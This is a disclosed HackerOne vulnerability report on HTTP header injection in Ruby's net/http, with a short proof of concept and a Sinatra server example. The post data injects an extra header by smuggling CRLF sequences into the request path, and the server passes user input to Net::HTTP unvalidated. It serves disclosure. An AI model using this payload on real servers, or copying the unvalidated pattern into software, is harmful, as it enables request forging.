---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '146416'
original_report_id: '146416'
title: Ruby:HTTP Header injection in 'net/http'
weakness: Open Redirect
team_handle: ruby
created_at: '2016-06-22T08:46:41.429Z'
disclosed_at: '2017-02-27T02:02:52.833Z'
has_bounty: false
visibility: full
substate: informative
vote_count: 4
tags:
- hackerone
- open-redirect
---

# Ruby:HTTP Header injection in 'net/http'

## Metadata

- HackerOne Report ID: 146416
- Weakness: Open Redirect
- Program: ruby
- Disclosed At: 2017-02-27T02:02:52.833Z
- Has Bounty: No
- Visibility: full
- Substate: informative

## Original Report

Hi,

I would like to report a HTTP Header injection vulnerability in 'net/http' that allows attackers to inject arbitrary headers in request even create a new evil request.

###PoC

```
require 'net/http'
http = Net::HTTP.new('192.168.30.214','80')
res = http.get("/r.php HTTP/1.1\r\nx-injection: memeda")

```
{F100919}

###Example
Server Code:
```
#!/usr/bin/env ruby
require 'sinatra'
require 'uri'
require 'net/http'

get '/' do
  'hello world'
end

post '/' do
  ip = params[:ip]
  port = params[:port]
  path = params[:path]

  # do what you want
  http = Net::HTTP.new ip, port.to_i
  res = http.get path

  res.body

end
```
post data:

```
ip=192.168.30.214&port=80&path=/r.php%20HTTP/1.1%0d%0ax-injection: memeda
```

print_r all HTTP Headers：

{F100918}


###Create an evil request

post data:

{F100920}

server log:
{F100921}


###Suggestion:

Should validate URI legality before send request

btw，

Cloud I have a CVEID with this vulnerability? reported by @redrain(rootredrain@gmail.com) and @ztz(ztz5651483@gmail.com)

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
